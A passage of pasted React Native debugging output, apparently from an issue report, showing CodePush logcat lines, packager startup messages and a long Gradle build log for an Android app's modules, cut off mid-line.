10678 I ReactNativeJS: [CodePush] Reporting CodePush update success (v1)\n[Info] 11-28 08:26:43.336 10486 10678 I ReactNativeJS: [CodePush] App is up to date.\n[Info] 11-28 08:26:43.336 10486 10678 I ReactNativeJS: [CodePush] App is up to date.\n[Info] 11-28 08:26:43.336 10486 10678 I ReactNativeJS: [CodePush] App is up to date.\n````\nOutput of the React-Native output channel (View -> Toggle Output -> Select React-Native in ListBox)\n````\n[Info] Starting Packager\nScanning 813 folders for symlinks in /Users/buzz/Sites/my_app/node_modules (6ms)\n \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \n \u2502  Running packager on port 8081.                                            \u2502 \n \u2502                                                                            \u2502 \n \u2502  Keep this packager running while developing on any JS projects. Feel      \u2502 \n \u2502  free to close this tab and run your own packager instance if you          \u2502 \n \u2502  prefer.                                                                   \u2502 \n \u2502                                                                            \u2502 \n \u2502  https://github.com/facebook/react-native                                  \u2502 \n \u2502                                                                            \u2502 \n \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \nLooking for JS files in\n   /Users/buzz/Sites/my_app \nReact packager ready.\nLoading dependency graph, done.\n[Info] Packager started.\n[Info] Prewarming bundle cache. This may take a while ...\n[Info] About to get: http://localhost:8081/index.android.bundle?platform=android\nBundling index.android.js  [development, non-minified, hmr disabled]  100.0% (730/730), done.\n[Warning] The Bundle Cache was prewarmed.\n[Info] Building and running application.\n[Info] Enable JS Debugging\nBundling index.android.js  [development, non-minified, hmr disabled]  100.0% (730/730), done.\n[Info] Packager is already running.\n[Info] Prewarming bundle cache. This may take a while ...\n[Info] About to get: http://localhost:8081/index.android.bundle?platform=android\n[Warning] The Bundle Cache was prewarmed.\n[Info] Building and running application.\n[Info] Enable JS Debugging\n[Info] Packager is already running.\n[Info] Prewarming bundle cache. This may take a while ...\n[Info] About to get: http://localhost:8081/index.android.bundle?platform=android\n[Warning] The Bundle Cache was prewarmed.\n[Info] Building and running application.\n[Info] Enable JS Debugging\n````\nOutput of the React-Native: Android output channel (View -> Toggle Output -> Select React-Native: Android in ListBox)\n````\n[Warning] Target simulator is not supported for Android platform. If you want to use particular device or simulator for launching Android app, please specify  device id (as in 'adb devices' output) instead.\n[Info] Starting React Native Packager.\n[Info] Attaching to running React Native packager\nScanning 813 folders for symlinks in /Users/buzz/Sites/my_app/node_modules (6ms)\nBuilding and installing the app on the device (cd android && ./gradlew installDebug)...\nThe JavaCompile.setDependencyCacheDir() method has been deprecated and is scheduled to be removed in Gradle 4.0.\nIncremental java compilation is an incubating feature.\nThe TaskInputs.source(Object) method has been deprecated and is scheduled to be removed in Gradle 4.0. Please use TaskInputs.file(Object).skipWhenEmpty() instead.\nThe Task.leftShift(Closure) method has been deprecated and is scheduled to be removed in Gradle 5.0. Please use Task.doLast(Action) instead.\n    at build_7rbq635vpl1nzd0u49jt44zzi.run(/Users/buzz/Sites/my_app/node_modules/realm/android/build.gradle:77)\n:app:preBuild UP-TO-DATE\n:app:preDebugBuild UP-TO-DATE\n:app:checkDebugManifest\n:app:preReleaseBuild UP-TO-DATE\n:mobile-center-analytics:preBuild UP-TO-DATE\n:mobile-center-analytics:preReleaseBuild UP-TO-DATE\n:mobile-center-analytics:checkReleaseManifest\n:mobile-center-analytics:preDebugAndroidTestBuild UP-TO-DATE\n:mobile-center-analytics:preDebugBuild UP-TO-DATE\n:mobile-center-analytics:preDebugUnitTestBuild UP-TO-DATE\n:mobile-center-analytics:preReleaseUnitTestBuild UP-TO-DATE\n:mobile-center-analytics:prepareComAndroidSupportAppcompatV72301Library UP-TO-DATE\n:mobile-center-analytics:prepareComAndroidSupportRecyclerviewV72301Library UP-TO-DATE\n:mobile-center-analytics:prepareComAndroidSupportSupportV42301Library UP-TO-DATE\n:mobile-center-analytics:prepareComFacebookFrescoDrawee081Library UP-TO-DATE\n:mobile-center-analytics:prepareComFacebookFrescoFbcore081Library UP-TO-DATE\n:mobile-center-analytics:prepareComFacebookFrescoFresco081Library UP-TO-DATE\n:mobile-center-analytics:prepareComFacebookFrescoImagepipeline081Library UP-TO-DATE\n:mobile-center-analytics:prepareComFacebookFrescoImagepipelineOkhttp081Library UP-TO-DATE\n:mobile-center-analytics:prepareComFacebookReactReactNative0191Library UP-TO-DATE\n:mobile-center-analytics:prepareComMicrosoftAzureMobileMobileCenter090Library UP-TO-DATE\n:mobile-center-analytics:prepareComMicrosoftAzureMobileMobileCenterAnalytics090Library UP-TO-DATE\n:mobile-center-analytics:prepareComMicrosoftAzureMobileReactMobileCenterReactNative050Library UP-TO-DATE\n:mobile-center-analytics:prepareOrgWebkitAndroidJscR174650Library UP-TO-DATE\n:mobile-center-analytics:prepareReleaseDependencies\n:mobile-center-analytics:compileReleaseAidl UP-TO-DATE\n:mobile-center-analytics:compileReleaseNdk UP-TO-DATE\n:mobile-center-analytics:compileLint UP-TO-DATE\n:mobile-center-analytics:copyReleaseLint UP-TO-DATE\n:mobile-center-analytics:compileReleaseRenderscript UP-TO-DATE\n:mobile-center-analytics:generateReleaseBuildConfig UP-TO-DATE\n:mobile-center-analytics:generateReleaseResValues UP-TO-DATE\n:mobile-center-analytics:generateReleaseResources UP-TO-DATE\n:mobile-center-analytics:mergeReleaseResources UP-TO-DATE\n:mobile-center-analytics:processReleaseManifest UP-TO-DATE\n:mobile-center-analytics:processReleaseResources UP-TO-DATE\n:mobile-center-analytics:generateReleaseSources UP-TO-DATE\n:mobile-center-analytics:incrementalReleaseJavaCompilationSafeguard UP-TO-DATE\n:mobile-center-analytics:compileReleaseJavaWithJavac UP-TO-DATE\n:mobile-center-analytics:extractReleaseAnnotations UP-TO-DATE\n:mobile-center-analytics:mergeReleaseShaders UP-TO-DATE\n:mobile-center-analytics:compileReleaseShaders UP-TO-DATE\n:mobile-center-analytics:generateReleaseAssets UP-TO-DATE\n:mobile-center-analytics:mergeReleaseAssets UP-TO-DATE\n:mobile-center-analytics:mergeReleaseProguardFiles UP-TO-DATE\n:mobile-center-analytics:packageReleaseRenderscript UP-TO-DATE\n:mobile-center-analytics:packageReleaseResources UP-TO-DATE\n:mobile-center-analytics:processReleaseJavaRes UP-TO-DATE\n:mobile-center-analytics:transformResourcesWithMergeJavaResForRelease UP-TO-DATE\n:mobile-center-analytics:transformClassesAndResourcesWithSyncLibJarsForRelease UP-TO-DATE\n:mobile-center-analytics:mergeReleaseJniLibFolders UP-TO-DATE\n:mobile-center-analytics:transformNative_libsWithMergeJniLibsForRelease UP-TO-DATE\n:mobile-center-analytics:transformNative_libsWithSyncJniLibsForRelease UP-TO-DATE\n:mobile-center-analytics:bundleRelease UP-TO-DATE\n:mobile-center-crashes:preBuild UP-TO-DATE\n:mobile-center-crashes:preReleaseBuild UP-TO-DATE\n:mobile-center-crashes:checkReleaseManifest\n:mobile-center-crashes:preDebugAndroidTestBuild UP-TO-DATE\n:mobile-center-crashes:preDebugBuild UP-TO-DATE\n:mobile-center-crashes:preDebugUnitTestBuild UP-TO-DATE\n:mobile-center-crashes:preReleaseUnitTestBuild UP-TO-DATE\n:mobile-center-crashes:prepareComAndroidSupportAppcompatV72301Library UP-TO-DATE\n:mobile-center-crashes:prepareComAndroidSupportRecyclerviewV72301Library UP-TO-DATE\n:mobile-center-crashes:prepareComAndroidSupportSupportV42301Library UP-TO-DATE\n:mobile-center-crashes:prepareComFacebookFrescoDrawee081Library UP-TO-DATE\n:mobile-center-crashes:prepareComFacebookFrescoFbcore081Library UP-TO-DATE\n:mobile-center-crashes:prepareComFacebookFrescoFresco081Library UP-TO-DATE\n:mobile-center-crashes:prepareComFacebookFrescoImagepipeline081Library UP-TO-DATE\n:mobile-center-crashes:prepareComFacebookFrescoImagepipelineOkhttp081Library UP-TO-DATE\n:mobile-center-crashes:prepareComFacebookReactReactNative0191Library UP-TO-DATE\n:mobile-center-crashes:prepareComMicrosoftAzureMobileMobileCenter090Library UP-TO-DATE\n:mobile-center-crashes:prepareComMicrosoftAzureMobileMobileCenterCrashes090Library UP-TO-DATE\n:mobile-center-crashes:prepareComMicrosoftAzureMobileReactMobileCenterReactNative050Library UP-TO-DATE\n:mobile-center-crashes:prepareOrgWebkitAndroidJscR174650Library UP-TO-DATE\n:mobile-center-crashes:prepareReleaseDependencies\n:mobile-center-crashes:compileReleaseAidl UP-TO-DATE\n:mobile-center-crashes:compileReleaseNdk UP-TO-DATE\n:mobile-center-crashes:compileLint UP-TO-DATE\n:mobile-center-crashes:copyReleaseLint UP-TO-DATE\n:mobile-center-crashes:compileReleaseRenderscript UP-TO-DATE\n:mobile-center-crashes:generateReleaseBuildConfig UP-TO-DATE\n:mobile-center-crashes:generateReleaseResValues UP-TO-DATE\n:mobile-center-crashes:generateReleaseResources UP-TO-DATE\n:mobile-center-crashes:mergeReleaseResources UP-TO-DATE\n:mobile-center-crashes:processReleaseManifest UP-TO-DATE\n:mobile-center-crashes:processReleaseResources UP-TO-DATE\n:mobile-center-crashes:generateReleaseSources UP-TO-DATE\n:mobile-center-crashes:incrementalReleaseJavaCompilationSafeguard UP-TO-DATE\n:mobile-center-crashes:compileReleaseJavaWithJavac UP-TO-DATE\n:mobile-center-crashes:extractReleaseAnnotations UP-TO-DATE\n:mobile-center-crashes:mergeReleaseShaders UP-TO-DATE\n:mobile-center-crashes:compileReleaseShaders UP-TO-DATE\n:mobile-center-crashes:generateReleaseAssets UP-TO-DATE\n:mobile-center-crashes:mergeReleaseAssets UP-TO-DATE\n:mobile-center-crashes:mergeReleaseProguardFiles UP-TO-DATE\n:mobile-center-crashes:packageReleaseRenderscript UP-TO-DATE\n:mobile-center-crashes:packageReleaseResources UP-TO-DATE\n:mobile-center-crashes:processReleaseJavaRes UP-TO-DATE\n:mobile-center-crashes:transformResourcesWithMergeJavaResForRelease UP-TO-DATE\n:mobile-center-crashes:transformClassesAndResourcesWithSyncLibJarsForRelease UP-TO-DATE\n:mobile-center-crashes:mergeReleaseJniLibFolders UP-TO-DATE\n:mobile-center-crashes:transformNative_libsWithMergeJniLibsForRelease UP-TO-DATE\n:mobile-center-crashes:transformNative_libsWithSyncJniLibsForRelease UP-TO-DATE\n:mobile-center-crashes:bundleRelease UP-TO-DATE\n:react-native-code-push:preBuild UP-TO-DATE\n:react-native-code-push:preReleaseBuild UP-TO-DATE\n:react-native-code-push:checkReleaseManifest\n:react-native-code-push:preDebugAndroidTestBuild UP-TO-DATE\n:react-native-code-push:preDebugBuild UP-TO-DATE\n:react-native-code-push:preDebugUnitTestBuild UP-TO-DATE\n:react-native-code-push:preReleaseUnitTestBuild UP-TO-DATE\n:react-native-code-push:prepareComAndroidSupportAppcompatV72301Library UP-TO-DATE\n:react-native-code-push:prepareComAndroidSupportSupportV42301Library UP-TO-DATE\n:react-native-code-push:prepareComFacebookFbuiTextlayoutbuilderTextlayoutbuilder100Library UP-TO-DATE\n:react-native-code-push:prepareComFacebookFrescoDrawee101Library UP-TO-DATE\n:react-native-code-push:prepareComFacebookFrescoFbcore101Library UP-TO-DATE\n:react-native-code-push:prepareComFacebookFrescoFresco101Library UP-TO-DATE\n:react-native-code-push:prepareComFacebookFrescoImagepipeline101Library UP-TO-DATE\n:react-native-code-push:prepareComFacebookFrescoImagepipelineBase101Library UP-TO-DATE\n:react-native-code-push:prepareComFacebookFrescoImagepipelineOkhttp3101Library UP-TO-DATE\n:react-native-code-push:prepareComFacebookReactReactNative0470Library UP-TO-DATE\n:react-native-code-push:prepareComFacebookSoloaderSoloader010Library UP-TO-DATE\n:react-native-code-push:prepareOrgWebkitAndroidJscR174650Library UP-TO-DATE\n:react-native-code-push:prepareReleaseDependencies\n:react-native-code-push:compileReleaseAidl UP-TO-DATE\n:react-native-code-push:compileReleaseNdk UP-TO-DATE\n:react-native-code-push:compileLint UP-TO-DATE\n:react-native-code-push:copyReleaseLint UP-TO-DATE\n:react-native-code-push:compileReleaseRenderscript UP-TO-DATE\n:react-native-code-push:generateReleaseBuildConfig UP-TO-DATE\n:react-native-code-push:generateReleaseResValues UP-TO-DATE\n:react-native-code-push:generateReleaseResources UP-TO-DATE\n:react-native-code-push:mergeReleaseResources UP-TO-DATE\n:react-native-code-push:processReleaseManifest UP-TO-DATE\n:react-native-code-push:processReleaseResources UP-TO-DATE\n:react-native-code-push:generateReleaseSources UP-TO-DATE\n:react-native-code-push:incrementalReleaseJavaCompilationSafeguard UP-TO-DATE\n:react-native-code-push:compileReleaseJavaWithJavac UP-TO-DATE\n:react-native-code-push:extractReleaseAnnotations UP-TO-DATE\n:react-native-code-push:mergeReleaseShaders UP-TO-DATE\n:react-native-code-push:compileReleaseShaders UP-TO-DATE\n:react-native-code-push:generateReleaseAssets UP-TO-DATE\n:react-native-code-push:mergeReleaseAssets UP-TO-DATE\n:react-native-code-push:mergeReleaseProguardFiles UP-TO-DATE\n:react-native-code-push:packageReleaseRenderscript UP-TO-DATE\n:react-native-code-push:packageReleaseResources UP-TO-DATE\n:react-native-code-push:processReleaseJavaRes UP-TO-DATE\n:react-native-code-push:transformResourcesWithMergeJavaResForRelease UP-TO-DATE\n:react-native-code-push:transformClassesAndResourcesWithSyncLibJarsForRelease UP-TO-DATE\n:react-native-code-push:mergeReleaseJniLibFolders UP-TO-DATE\n:react-native-code-push:transformNative_libsWithMergeJniLibsForRelease UP-TO-DATE\n:react-native-code-push:transformNative_libsWithSyncJniLibsForRelease UP-TO-DATE\n:react-native-code-push:bundleRelease UP-TO-DATE\n:react-native-device-info:preBuild UP-TO-DATE\n:react-native-device-info:preReleaseBuild UP-TO-DATE\n:react-native-device-info:checkReleaseManifest\n:react-native-device-info:preDebugAndroidTestBuild UP-TO-DATE\n:react-native-device-info:preDebugBuild UP-TO-DATE\n:react-native-device-info:preDebugUnitTestBuild UP-TO-DATE\n:react-native-device-info:preReleaseUnitTestBuild UP-TO-DATE\n:react-native-device-info:prepareComAndroidSupportAppcompatV72301Library UP-TO-DATE\n:react-native-device-info:prepareComAndroidSupportSupportCompat2520Library UP-TO-DATE\n:react-native-device-info:prepareComAndroidSupportSupportCoreUi2520Library UP-TO-DATE\n:react-native-device-info:prepareComAndroidSupportSupportCoreUtils2520Library UP-TO-DATE\n:react-native-device-info:prepareComAndroidSupportSupportFragment2520Library UP-TO-DATE\n:react-native-device-info:prepareComAndroidSupportSupportMediaCompat2520Library UP-TO-DATE\n:react-native-device-info:prepareComAndroidSupportSupportV42520Library UP-TO-DATE\n:react-native-device-info:prepareComFacebookFbuiTextlayoutbuilderTextlayoutbuilder100Library UP-TO-DATE\n:react-native-device-info:prepareComFacebookFrescoDrawee101Library UP-TO-DATE\n:react-native-device-info:prepareComFacebookFrescoFbcore101Library UP-TO-DATE\n:react-native-device-info:prepareComFacebookFrescoFresco101Library UP-TO-DATE\n:react-native-device-info:prepareComFacebookFrescoImagepipeline101Library UP-TO-DATE\n:react-native-device-info:prepareComFacebookFrescoImagepipelineBase101Library UP-TO-DATE\n:react-native-device-info:prepareComFacebookFrescoImagepipelineOkhttp3101Library UP-TO-DATE\n:react-native-device-info:prepareComFacebookReactReactNative0470Library UP-TO-DATE\n:react-native-device-info:prepareComFacebookSoloaderSoloader010Library UP-TO-DATE\n:react-native-device-info:prepareComGoogleAndroidGmsPlayServicesBase1102Library UP-TO-DATE\n:react-native-device-info:prepareComGoogleAndroidGmsPlayServicesBasement1102Library UP-TO-DATE\n:react-native-device-info:prepareComGoogleAndroidGmsPlayServicesGcm1102Library UP-TO-DATE\n:react-native-device-info:prepareComGoogleAndroidGmsPlayServicesIid1102Library UP-TO-DATE\n:react-native-device-info:prepareComGoogleAndroidGmsPlayServicesTasks1102Library UP-TO-DATE\n:react-native-device-info:prepareOrgWebkitAndroidJscR174650Library UP-TO-DATE\n:react-native-device-info:prepareReleaseDependencies\n:react-native-device-info:compileReleaseAidl UP-TO-DATE\n:react-native-device-info:compileReleaseNdk UP-TO-DATE\n:react-native-device-info:compileLint UP-TO-DATE\n:react-native-device-info:copyReleaseLint UP-TO-DATE\n:react-native-device-info:compileReleaseRenderscript UP-TO-DATE\n:react-native-device-info:generateReleaseBuildConfig UP-TO-DATE\n:react-native-device-info:generateReleaseResValues UP-TO-DATE\n:react-native-device-info:generateReleaseResources UP-TO-DATE\n:react-native-device-info:mergeReleaseResources UP-TO-DATE\n:react-native-device-info:processReleaseManifest UP-TO-DATE\n:react-native-device-info:processReleaseResources UP-TO-DATE\n:react-native-device-info:generateReleaseSources UP-TO-DATE\n:react-native-device-info:incrementalReleaseJavaCompilationSafeguard UP-TO-DATE\n:react-native-device-info:compileReleaseJavaWithJavac UP-TO-DATE\n:react-native-device-info:extractReleaseAnnotations UP-TO-DATE\n:react-native-device-info:mergeReleaseShaders UP-TO-DATE\n:react-native-device-info:compileReleaseShaders UP-TO-DATE\n:react-native-device-info:generateReleaseAssets UP-TO-DATE\n:react-native-device-info:mergeReleaseAssets UP-TO-DATE\n:react-native-device-info:mergeReleaseProguardFiles UP-TO-DATE\n:react-native-device-info:packageReleaseRenderscript UP-TO-DATE\n:react-native-device-info:packageReleaseResources UP-TO-DATE\n:react-native-device-info:processReleaseJavaRes UP-TO-DATE\n:react-native-device-info:transformResourcesWithMergeJavaResForRelease UP-TO-DATE\n:react-native-device-info:transformClassesAndResourcesWithSyncLibJarsForRelease UP-TO-DATE\n:react-native-device-info:mergeReleaseJniLibFolders UP-TO-DATE\n:react-native-device-info:transformNative_libsWithMergeJniLibsForRelease UP-TO-DATE\n:react-native-device-info:transformNative_libsWithSyncJniLibsForRelease UP-TO-DATE\n:react-native-device-info:bundleRelease UP-TO-DATE\n:react-native-image-picker:preBuild UP-TO-DATE\n:react-native-image-picker:preReleaseBuild UP-TO-DATE\n:react-native-image-picker:checkReleaseManifest\n:react-native-image-picker:preDebugAndroidTestBuild UP-TO-DATE\n:react-native-image-picker:preDebugBuild UP-TO-DATE\n:react-native-image-picker:preDebugUnitTestBuild UP-TO-DATE\n:react-native-image-picker:preReleaseUnitTestBuild UP-TO-DATE\n:react-native-image-picker:prepareComAndroidSupportAppcompatV72301Library UP-TO-DATE\n:react-native-image-picker:prepareComAndroidSupportSupportV42301Library UP-TO-DATE\n:react-native-image-picker:prepareComFacebookFbuiTextlayoutbuilderTextlayoutbuilder100Library UP-TO-DATE\n:react-native-image-picker:prepareComFacebookFrescoDrawee101Library UP-TO-DATE\n:react-native-image-picker:prepareComFacebookFrescoFbcore101Library UP-TO-DATE\n:react-native-image-picker:prepareComFacebookFrescoFresco101Library UP-TO-DATE\n:react-native-image-picker:prepareComFacebookFrescoImagepipeline101Library UP-TO-DATE\n:react-native-image-picker:prepareComFacebookFrescoImagepipelineBase101Library UP-TO-DATE\n:react-native-image-picker:prepareComFacebookFrescoImagepipelineOkhttp3101Library UP-TO-DATE\n:react-native-image-picker:prepareComFacebookReactReactNative0470Library UP-TO-DATE\n:react-native-image-picker:prepareComFacebookSoloaderSoloader010Library UP-TO-DATE\n:react-native-image-picker:prepareOrgWebkitAndroidJscR174650Library UP-TO-DATE\n:react-native-image-picker:prepareReleaseDependencies\n:react-native-image-picker:compileReleaseAidl UP-TO-DATE\n:react-native-image-picker:compileReleaseNdk UP-TO-DATE\n:react-native-image-picker:compileLint UP-TO-DATE\n:react-native-image-picker:copyReleaseLint UP-TO-DATE\n:react-native-image-picker:compileReleaseRenderscript UP-TO-DATE\n:react-native-image-picker:generateReleaseBuildConfig UP-TO-DATE\n:react-native-image-picker:generateReleaseResValues UP-TO-DATE\n:react-native-image-picker:generateReleaseResources UP-TO-DATE\n:react-native-image-picker:mergeReleaseResources UP-TO-DATE\n:react-native-image-picker:processReleaseManifest UP-TO-DATE\n:react-native-image-picker:processReleaseResources UP-TO-DATE\n:react-native-image-picker:generateReleaseSources UP-TO-DATE\n:react-native-image-picker:incrementalReleaseJavaCompilationSafeguard UP-TO-DATE\n:react-native-image-picker:compileReleaseJavaWithJavac UP-TO-DATE\n:react-native-image-picker:extractReleaseAnnotations UP-TO-DATE\n:react-native-image-picker:mergeReleaseShaders UP-TO-DATE\n:react-native-image-picker:compileReleaseShaders UP-TO-DATE\n:react-native-image-picker:generateReleaseAssets UP-TO-DATE\n:react-native-image-picker:mergeReleaseAssets UP-TO-DATE\n:react-native-image-picker:mergeReleaseProguardFiles UP-TO-DATE\n:react-native-image-picker:packageReleaseRenderscript UP-TO-DATE\n:react-native-image-picker:packageReleaseResources UP-TO-DATE\n:react-native-image-picker:processReleaseJavaRes UP-TO-DATE\n:react-native-image-picker:transformResourcesWithMergeJavaResForRelease UP-TO-DATE\n:react-native-image-picker:transformClassesAndResourcesWithSyncLibJarsForRelease UP-TO-DATE\n:react-native-image-picker:mergeReleaseJniLibFolders UP-TO-DATE\n:react-native-image-picker:transformNative_libsWithMergeJniLibsForRelease UP-TO-DATE\n:react-native-image-picker:transformNative_libsWithSyncJniLibsForRelease UP-TO-DATE\n:react-native-image-picker:bundleRelease UP-TO-DATE\n:react-native-vector-icons:preBuild UP-TO-DATE\n:react-native-vector-icons:preReleaseBuild UP-TO-DATE\n:react-native-vector-icons:checkReleaseManifest\n:react-native-vector-icons:preDebugAndroidTestBuild UP-TO-DATE\n:react-native-vector-icons:preDebugBuild UP-TO-DATE\n:react-native-vector-icons:preDebugUnitTestBuild UP-TO-DATE\n:react-native-vector-icons:preReleaseUnitTestBuild UP-TO-DATE\n:react-native-vector-icons:prepareComAndroidSupportAppcompatV72301Library UP-TO-DATE\n:react-native-vector-icons:prepareComAndroidSupportSupportV42301Library UP-TO-DATE\n:react-native-vector-icons:prepareComFacebookFbuiTextlayoutbuilderTextlayoutbuilder100Library UP-TO-DATE\n:react-native-vector-icons:prepareComFacebookFrescoDrawee101Library UP-TO-DATE\n:react-native-vector-icons:prepareComFacebookFrescoFbcore101Library UP-TO-DATE\n:react-native-vector-icons:prepareComFacebookFrescoFresco101Library UP-TO-DATE\n:react-native-vector-icons:prepareComFacebookFrescoImagepipeline101Library UP-TO-DATE\n:react-native-vector-icons:prepareComFacebookFrescoImagepipelineBase101Library UP-TO-DATE\n:react-native-vector-icons:prepareComFacebookFrescoImagepipelineOkhttp3101Library UP-TO-DATE\n:react-native-vector-icons:prepareComFacebookReactReactNative0470Library UP-TO-DATE\n:react-native-vector-icons:prepareComFacebookSoloaderSoloader010Library UP-TO-DATE\n:react-native-vector-icons:prepareOrgWebkitAndroidJscR174650Library UP-TO-DATE\n:react-native-vector-icons:prepareReleaseDependencies\n:react-native-vector-icons:compileReleaseAidl UP-TO-DATE\n:react-native-vector-icons:compileReleaseNdk UP-TO-DATE\n:react-native-vector-icons:compileLint UP-TO-DATE\n:react-native-vector-icons:copyReleaseLint UP-TO-DATE\n:react-native-vector-icons:compileReleaseRenderscript UP-TO-DATE\n:react-native-vector-icons:generateReleaseBuildConfig UP-TO-DATE\n:react-native-vector-icons:generateReleaseResValues UP-TO-DATE\n:react-native-vector-icons:generateReleaseResources UP-TO-DATE\n:react-native-vector-icons:mergeReleaseResources UP-TO-DATE\n:react-native-vector-icons:processReleaseManifest UP-TO-DATE\n:react-native-vector-icons:processReleaseResources UP-TO-DATE\n:react-native-vector-icons:generateReleaseSources UP-TO-DATE\n:react-native-vector-icons:incrementalReleaseJavaCompilationSafeguard UP-TO-DATE\n:react-native-vector-icons:compileReleaseJavaWithJavac UP-TO-DATE\n:react-native-vector-icons:extractReleaseAnnotations UP-TO-DATE\n:react-native-vector-icons:mergeReleaseShaders UP-TO-DATE\n:react-native-vector-icons:compileReleaseShaders UP-TO-DATE\n:react-native-vector-icons:generateReleaseAssets UP-TO-DATE\n:react-native-vector-icons:mergeReleaseAssets UP-TO-DATE\n:react-native-vector-icons:mergeReleaseProguardFiles UP-TO-DATE\n:react-native-vector-icons:packageReleaseRenderscript UP-TO-DATE\n:react-native-vector-icons:packageReleaseResources UP-TO-DATE\n:react-native-vector-icons:processReleaseJavaRes UP-TO-DATE\n:react-native-vector-icons:transformResourcesWithMergeJavaResForRelease UP-TO-DATE\n:react-native-vector-icons:transformClassesAndResourcesWithSyncLibJarsForRelease UP-TO-DATE\n:react-native-vector-icons:mergeReleaseJniLibFolders UP-TO-DATE\n:react-native-vector-icons:transformNative_libsWithMergeJniLibsForRelease UP-TO-DATE\n:react-native-vector-icons:transformNative_libsWithSyncJniLibsForRelease UP-TO-DATE\n:react-native-vector-icons:bundleRelease UP-TO-DATE\n:reactnativesignaturecapture:preBuild UP-TO-DATE\n:reactnativesignaturecapture:preReleaseBuild UP-TO-DATE\n:reactnativesignaturecapture:checkReleaseManifest\n:reactnativesignaturecapture:preDebugAndroidTestBuild UP-TO-DATE\n:reactnativesignaturecapture:preDebugBuild UP-TO-DATE\n:reactnativesignaturecapture:preDebugUnitTestBuild UP-TO-DATE\n:reactnativesignaturecapture:preReleaseUnitTestBuild UP-TO-DATE\n:reactnativesignaturecapture:prepareComAndroidSupportAppcompatV72301Library UP-TO-DATE\n:reactnativesignaturecapture:prepareComAndroidSupportRecyclerviewV72301Library UP-TO-DATE\n:reactnativesignaturecapture:prepareComAndroidSupportSupportV42301Library UP-TO-DATE\n:reactnativesignaturecapture:prepareComFacebookFrescoDrawee081Library UP-TO-DATE\n:reactnativesignaturecapture:prepareComFacebookFrescoFbcore081Library UP-TO-DATE\n:reactnativesignaturecapture:prepareComFacebookFrescoFresco081Library UP-TO-DATE\n:reactnativesignaturecapture:prepareComFacebookFrescoImagepipeline081Library UP-TO-DATE\n:reactnativesignaturecapture:prepareComFacebookFrescoImagepipelineOkhttp081Library UP-TO-DATE\n:reactnativesignaturecapture:prepareComFacebookReactReactNative0191Library UP-TO-DATE\n:reactnativesignaturecapture:prepareOrgWebkitAndroidJscR174650Library UP-TO-DATE\n:reactnativesignaturecapture:prepareReleaseDependencies\n:reactnativesignaturecapture:compileReleaseAidl UP-TO-DATE\n:reactnativesignaturecapture:compileReleaseNdk UP-TO-DATE\n:reactnativesignaturecapture:compileLint UP-TO-DATE\n:reactnativesignaturecapture:copyReleaseLint UP-TO-DATE\n:reactnativesignaturecapture:compileReleaseRenderscript UP-TO-DATE\n:reactnativesignaturecapture:generateReleaseBuildConfig UP-TO-DATE\n:reactnativesignaturecapture:generateReleaseResValues UP-TO-DATE\n:reactnativesignaturecapture:generateReleaseResources UP-TO-DATE\n:reactnativesignaturecapture:mergeReleaseResources UP-TO-DATE\n:reactnativesignaturecapture:processReleaseManifest UP-TO-DATE\n:reactnativesignaturecapture:processReleaseResources UP-TO-DATE\n:reactnativesignaturecapture:generateReleaseSources UP-TO-DATE\n:reactnativesignaturecapture:incrementalReleaseJavaCompilationSafeguard UP-TO-DATE\n:reactnativesignaturecapture:compileReleaseJavaWithJavac UP-TO-DATE\n:reactnativesignaturecapture:extractReleaseAnnotations UP-TO-DATE\n:reactnativesignaturecapture:mergeReleaseShaders UP-TO-DATE\n:reactnativesignaturecapture:compileReleaseShaders UP-TO-DATE\n:reactnativesignaturecapture:generateReleaseAssets UP-TO-DATE\n:reactnativesignaturecapture:mergeReleaseAssets UP-TO-DATE\n:reactnativesignaturecapture:mergeReleaseProguardFiles UP-TO-DATE\n:reactnativesignaturecapture:packageReleaseRenderscript UP-TO-DATE\n:reactnativesignaturecapture:packageReleaseResources UP-TO-DATE\n:reactnativesignaturecapture:processReleaseJavaRes UP-TO-DATE\n:reactnativesignaturecapture:transformResourcesWithMergeJavaResForRelease UP-TO-DATE\n:reactnativesignaturecapture:transformClassesAndResourcesWithSyncLibJarsForRelease UP-TO-DATE\n:reactnativesignaturecapture:mergeReleaseJniLibFolders UP-TO-DATE\n:reactnativesignaturecapture:transformNative_libsWithMergeJniLibsForRelease UP-TO-DATE\n:reactnativesignaturecapture:transformNative_libsWithSyncJniLibsForRelease UP-TO-DATE\n:reactnativesignaturecapture:bundleRelease UP-TO-DATE\n:realm:send\n:realm:preBuild\n:realm:preReleaseBuild\n:realm:checkReleaseManifest\n:realm:preDebugAndroidTestBuild\n:realm:preDebugBuild\n:realm:preDebugUnitTestBuild\n:realm:preReleaseUnitTestBuild\n:realm:prepareComAndroidSupportAppcompatV72301Library UP-TO-DATE\n:realm:prepareComAndroidSupportSupportV42301Library UP-TO-DATE\n:realm:prepareComFacebookFbuiTextlayoutbuilderTextlayoutbuilder100Library UP-TO-DATE\n:realm:prepareComFacebookFrescoDrawee101Library UP-TO-DATE\n:realm:prepareComFacebookFrescoFbcore101Library UP-TO-DATE\n:realm:prepareComFacebookFrescoFresco101Library UP-TO-DATE\n:realm:prepareComFacebookFrescoImagepipeline101Library UP-TO-DATE\n:realm:prepareComFacebookFrescoImagepipelineBase101Library UP-TO-DATE\n:realm:prepareComFacebookFrescoImagepipelineOkhttp3101Library 